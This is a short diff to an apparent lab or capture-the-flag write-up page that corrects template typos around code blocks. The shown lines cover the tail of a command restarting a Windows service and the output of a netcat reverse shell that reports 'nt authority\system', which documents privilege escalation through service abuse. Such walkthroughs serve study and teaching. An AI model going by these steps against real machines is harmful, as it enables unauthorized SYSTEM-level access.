@@ -658,11 +658,11 @@ C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> sc 
 sc start AdvancedSystemCareService9{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 The `privilege shell` would be spawned from the latter `netcat` listener.
-{% capture code %}{% raw %}Connection from <target-ip? 49305 received!
+{% capture code %}{% raw %}Connection from <target-ip> 49305 received!
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
 whoami
-nt authority\system% endraw %}{% endcapture %} {% include code.html code=code %}
+nt authority\system{% endraw %}{% endcapture %} {% include code.html code=code %}
 
